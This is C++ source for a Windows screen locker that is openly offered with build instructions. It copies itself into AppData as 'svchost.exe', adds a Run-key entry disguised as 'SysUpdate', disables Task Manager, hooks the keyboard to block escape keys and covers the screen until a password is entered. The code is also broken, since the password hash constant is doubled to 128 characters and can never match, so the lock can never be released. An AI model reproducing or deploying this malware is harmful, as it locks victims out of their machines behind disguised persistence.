// language: C++, file: locker.cpp, target: Windows 10/11 x64, MSVC 2022
// Build: cl /std:c++17 /EHsc /O2 locker.cpp user32.lib gdi32.lib advapi32.lib shell32.lib bcrypt.lib
// Purpose: fullscreen locker with keyboard hook, persistence, SHA-256 password.

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <bcrypt.h>
#include <string>
#include <vector>
#include <cstdio>

#pragma comment(lib, "bcrypt.lib")

// --- config: SHA-256 of password "letmein" (replace with your own) ---
// generate: echo -n "yourpass" | sha256sum
static const char* kHashHex =
    "d76e70810a49498e5fc5de5ae58297172bc9eb1b4545f24353d9b79a342133a1"  // placeholder — replace full 64 chars
    "d76e70810a49498e5fc5de5ae58297172bc9eb1b4545f24353d9b79a342133a1";

static HHOOK   g_kbHook    = nullptr;
static HWND    g_hwnd      = nullptr;
static bool    g_locked    = true;
static std::wstring g_input;

// ---------- SHA-256 ----------
static std::string Sha256Hex(const std::string& in) {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_HASH_HANDLE hHash = nullptr;
    DWORD cbData = 0, cbHash = 0, cbHashObj = 0;
    std::vector<BYTE> hashObj, hash;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, nullptr, 0);
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbHashObj, sizeof(DWORD), &cbData, 0);
    BCryptGetProperty(hAlg, BCRYPT_HASH_LENGTH,   (PUCHAR)&cbHash,   sizeof(DWORD), &cbData, 0);
    hashObj.resize(cbHashObj);
    hash.resize(cbHash);

    BCryptCreateHash(hAlg, &hHash, hashObj.data(), cbHashObj, nullptr, 0, 0);
    BCryptHashData(hHash, (PUCHAR)in.data(), (ULONG)in.size(), 0);
    BCryptFinishHash(hHash, hash.data(), cbHash, 0);

    BCryptDestroyHash(hHash);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    static const char* hex = "0123456789abcdef";
    std::string out;
    out.reserve(cbHash * 2);
    for (BYTE b : hash) { out.push_back(hex[b >> 4]); out.push_back(hex[b & 0xF]); }
    return out;
}

// ---------- persistence ----------
static void InstallPersistence() {
    wchar_t self[MAX_PATH]{};
    GetModuleFileNameW(nullptr, self, MAX_PATH);

    wchar_t appdata[MAX_PATH]{};
    GetEnvironmentVariableW(L"APPDATA", appdata, MAX_PATH);
    std::wstring dst = std::wstring(appdata) + L"\\svchost.exe";

    CopyFileW(self, dst.c_str(), FALSE);

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"SysUpdate", 0, REG_SZ,
            (const BYTE*)dst.c_str(), (DWORD)((dst.size()+1)*sizeof(wchar_t)));
        RegCloseKey(hKey);
    }

    // disable Task Manager
    if (RegCreateKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, nullptr, 0, KEY_SET_VALUE, nullptr, &hKey, nullptr) == ERROR_SUCCESS) {
        DWORD v = 1;
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
        RegCloseKey(hKey);
    }
}

// ---------- keyboard hook ----------
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && g_locked) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            // swallow system keys that escape the desktop
            if (p->vkCode == VK_LWIN || p->vkCode == VK_RWIN ||
                p->vkCode == VK_TAB  || p->vkCode == VK_ESCAPE ||
                p->vkCode == VK_F4   || p->vkCode == VK_MENU ||
                p->vkCode == VK_CONTROL || p->vkCode == VK_DELETE) {
                return 1;
            }
        }
    }
    return CallNextHookEx(g_kbHook, nCode, wParam, lParam);
}

// ---------- window proc ----------
static LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
    switch (msg) {
    case WM_CREATE: {
        // topmost, fullscreen, no frame
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);
        SetWindowPos(h, HWND_TOPMOST, 0, 0, sw, sh, SWP_SHOWWINDOW);
        ShowCursor(FALSE);
        g_hwnd = h;
        return 0;
    }
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC dc = BeginPaint(h, &ps);
        RECT rc; GetClientRect(h, &rc);
        HBRUSH bg = CreateSolidBrush(RGB(10, 10, 14));
        FillRect(dc, &rc, bg);
        DeleteObject(bg);
        SetBkMode(dc, TRANSPARENT);
        SetTextColor(dc, RGB(220, 220, 230));
        HFONT f = CreateFontW(28, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Segoe UI");
        SelectObject(dc, f);
        DrawTextW(dc, L"SYSTEM LOCKED", -1, &rc, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        // password field below
        RECT r2 = rc; r2.top += 120;
        std::wstring stars(g_input.size(), L'*');
        DrawTextW(dc, stars.c_str(), -1, &r2, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        DeleteObject(f);
        EndPaint(h, &ps);
        return 0;
    }
    case WM_CHAR: {
        if (w == VK_BACK && !g_input.empty()) g_input.pop_back();
        else if (w >= 32 && w < 127) g_input.push_back((wchar_t)w);
        InvalidateRect(h, nullptr, TRUE);

        if (g_input.size() >= 1) {
            // check on Enter (VK_RETURN arrives as WM_KEYDOWN)
        }
        return 0;
    }
    case WM_KEYDOWN: {
        if (w == VK_RETURN) {
            std::string ascii(g_input.begin(), g_input.end());
            std::string h2 = Sha256Hex(ascii);
            if (h2 == kHashHex) {
                g_locked = false;
                // restore task manager
                HKEY hk;
                if (RegOpenKeyExW(HKEY_CURRENT_USER,
                    L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                    0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
                    DWORD v = 0;
                    RegSetValueExW(hk, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
                    RegCloseKey(hk);
                }
                UnhookWindowsHookEx(g_kbHook);
                DestroyWindow(h);
                PostQuitMessage(0);
            } else {
                g_input.clear();
                InvalidateRect(h, nullptr, TRUE);
            }
        }
        return 0;
    }
    case WM_DESTROY:
        ShowCursor(TRUE);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(h, msg, w, l);
}

// ---------- entry ----------
int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int) {
    InstallPersistence();

    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInst, 0);

    WNDCLASSW wc{};
    wc.lpfnWndProc   = WndProc;
    wc.hInstance     = hInst;
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = L"LockerWnd";
    RegisterClassW(&wc);

    CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"LockerWnd", L"System", WS_POPUP,
        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        nullptr, nullptr, hInst, nullptr);

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    if (g_kbHook) UnhookWindowsHookEx(g_kbHook);
    return 0;
}
